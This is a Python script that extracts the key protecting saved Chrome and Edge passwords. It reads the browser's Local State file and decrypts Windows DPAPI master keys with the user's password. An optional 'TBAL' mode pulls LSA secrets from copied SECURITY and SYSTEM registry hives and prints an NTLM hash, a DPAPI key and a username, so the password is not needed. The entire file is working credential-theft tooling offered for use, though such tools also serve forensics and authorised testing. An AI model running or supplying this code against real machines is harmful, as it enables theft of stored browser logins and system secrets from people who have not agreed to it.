#!/usr/bin/python3
#
# Chrome / new Edge Browser password extracter.
# This only extract the key needed to decrypt the credentials 
# Output is decrypted.bin if called as standalone, return decrypted key to main script
# 
# Added TBAL option, a DPAPI flaw you can read more about
# https://vztekoverflow.com/2018/07/31/tbal-dpapi-backdoor/ 
# if TBAL is available, you need to specify the registry folder but you don't need the user password
# 

import argparse
import sys
import os
import json
import base64
import re
import binascii
from dpapick3 import blob, masterkey, registry

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
class Dpapi_decrypt(object):
    def __init__(self, d='./', m=None, u=None, s=None, n=False, t=False, c=None):
        self.dir_location = d
        self.masterkey_location = m
        self.sid_value = s
        self.user_password = u
        self.nopass = n
        self.tba = t
        self.config = c
        self.entropy= None
        self.enc_key =''
    def local_state_file(self, path):
        with open(os.path.join(path , 'Local State'), "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        enc_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        enc_key = enc_key[5:]  # removing DPAPI text
        return enc_key

    def return_key(self):
        return(self.enc_key)

    def main(self):
        if not os.path.isfile(os.path.join(self.dir_location , 'Local State')):
            sys.exit("No Local State file found")
        if not os.path.isfile(os.path.join(self.dir_location ,'Default', 'Login Data')):
            sys.exit("No Local State found in Default that directory")
        else:
            print(bcolors.OKGREEN +" * "+ bcolors.ENDC + "Local State and Login Data files found" )
        #call function to read Local State file and get an impacket Blob dpapi file
        #open dpapi blob

        key = self.local_state_file(self.dir_location)
        bl = blob.DPAPIBlob(key)
        
        file_list=[]
        if (self.masterkey_location):
            mkp = masterkey.MasterKeyPool()
            mkp.loadDirectory(self.masterkey_location)
            mks = mkp.getMasterKeys(bl.mkguid.encode())
            if len(mks) == 0:
                sys.exit('[-] Unable to find MK for blob %s' % bl.mkguid)
            else:
                print(bcolors.OKGREEN +" * "+ bcolors.ENDC + "MasterKey file found" )
        else:
            print("Needed masterkey(-m) directory with the location of " + bl.mkguid)
            sys.exit(2)
        if not (self.sid_value):
            try:
                self.sid_value = ( re.search('((S-1).*?)/', self.masterkey_location )[1])
                print(bcolors.OKGREEN +" * "+ bcolors.ENDC + "SID " + self.sid_value )
            except:
                print("Need to specify SID")
                sys.exit(2)
        #Check if using TBA located key
        if self.tba:
            #TODO tba get key
            # read LSA secrets, find TBAL key
            reg = registry.Regedit()
            if self.config == None:
                sys.exit("Need to set config directory (\Windows\System32\config)")
            security = os.path.join(self.config,"SECURITY")
            system = os.path.join(self.config,"SYSTEM")
            if not(os.path.isfile(security) and os.path.isfile(system)):
                sys.exit("SYSTEM or SECURITY error opening")
            secrets = reg.get_lsa_secrets(security, system)
            for i in list(secrets.keys()):
                for k, v in list(secrets[i].items()):
                    if k in ('CurrVal', 'OldVal'):
                        data = v.hex()
                        if ("TBAL" in i):
                            ntlm = str(data)[32:64]
                            tbal_data = str(data)[96:136]
                            print ('NTLM: %s  DPAPI_key %s' % (ntlm, tbal_data))
                            try: print('User: %s' % binascii.unhexlify((data)[288:]).decode())
                            except:
                                pass
                            break
            if tbal_data == None:
                sys.exit("No TBAL found")
            # go for the decrypt
            key_p = binascii.unhexlify(tbal_data)
            mkp.try_credential_hash(self.sid_value,key_p)


        else:
            #Check if password or nopass
            if self.nopass:
                    self.user_password= ''
            elif not self.user_password:
                print("Need user password (-p)")
                sys.exit(2)
            # go for the decrypt
            #Add chredhist
            #mkp.addCredhistFile(sid, os.path.join('Protect','CREDHIST'))
            mkp.try_credential(self.sid_value, self.user_password)

        for mk in mks:
            if self.tba:
                mk.decryptWithHash(self.sid_value,key_p)
            else:
                mk.decryptWithPassword(self.sid_value,self.user_password)
            if mk.decrypted:
                print(bcolors.OKGREEN +" * "+ bcolors.ENDC + "Mk decrypted")
                bl.decrypt(mk.get_key(), entropy=self.entropy)
                if bl.decrypted:
                    #if called alone
                    if __name__ == "__main__": 
                        decrypted = bl.cleartext.hex()
                        print(decrypted)
                        print()
                        print("# # Success! (saved to decrypted.bin) # #")
                        print()
                        #print(decrypted.decode('utf-16-le'))
                        f = open('decrypted.bin','wb')
                        f.write(bl.cleartext)
                        f.close()
                    else:
                        # if called as module import 
                        self.enc_key = bl.cleartext
            else:
                # Just print the data
                print(bcolors.FAIL +" * * * * * * * * * *  "+ bcolors.ENDC )
                print(bcolors.FAIL +" * "+ bcolors.ENDC + "Error decrypting, Wrong Password?")
                print(bcolors.FAIL +" * * * * * * * * * *  "+ bcolors.ENDC )
                print(bl)

if __name__ == "__main__":
    # arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("--dir","-d",default='./', help="directory where Local State and Login Data is located")
    parser.add_argument("--masterkey", "-m",  help="set masterkey directory")
    parser.add_argument("--sid", "-s",  help="set SID(optional)")
    parser.add_argument("--password", "-p", help="user password")
    parser.add_argument("--nopass","-n",dest="nopass",action='store_true',help="no password")
    parser.add_argument("--config","-c",dest="config_reg",help="Register files location (Usually \Windows\System32\config")
    parser.add_argument("--tbal","-t", dest="tba", action='store_true', help="if TBA, use DPAPI key")
    parser.set_defaults(nopass=False)
    parser.set_defaults(tba=False)
    #parser.set_defaults(sid=None)
    args = parser.parse_args()
    obj = Dpapi_decrypt(args.dir, args.masterkey,args.password, args.sid, args.nopass,args.tba, args.config_reg)
    
    obj.main()
